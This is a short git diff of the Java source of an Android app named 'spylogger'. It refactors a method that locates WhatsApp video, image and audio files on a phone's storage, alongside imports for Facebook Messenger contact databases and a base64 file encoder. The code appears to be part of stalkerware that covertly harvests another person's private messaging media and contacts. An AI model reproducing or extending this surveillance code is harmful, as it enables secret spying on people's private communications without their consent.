@@ -27,6 +27,7 @@ import android.widget.Toast;
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.R;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookContacts;
+import com.gravatasufoca.spylogger.model.TipoMidia;
 import com.gravatasufoca.spylogger.model.messenger.Contact;
 import com.gravatasufoca.spylogger.receivers.Alarm;
 import com.gravatasufoca.spylogger.services.MessengerService;
@@ -350,18 +351,9 @@ public class Utils {
         return Base64.encodeToString(getBytesFromFile(f), Base64.NO_WRAP);
     }
 
-    public static File getMediaFile(String tipo, long tamanho, Date data, int dias) {
-        String path = Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp " + tipo;
-
-        String prefixo = "";
-        if (tipo.equals("Video"))
-            prefixo = "vid";
-        else if (tipo.equals("Images"))
-            prefixo = "img";
-        else if (tipo.equals("Audio"))
-            prefixo = "aud";
-
-        final String nome = prefixo + "-";
+    public static File getMediaFile(TipoMidia tipo, long tamanho, Date data, int dias) {
+        String path = Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp " + tipo.getTipo();
+        final String nome = tipo.getPrefixo() + "-";
         File dir = new File(path);
 
         final List<String> datas = new ArrayList<String>();
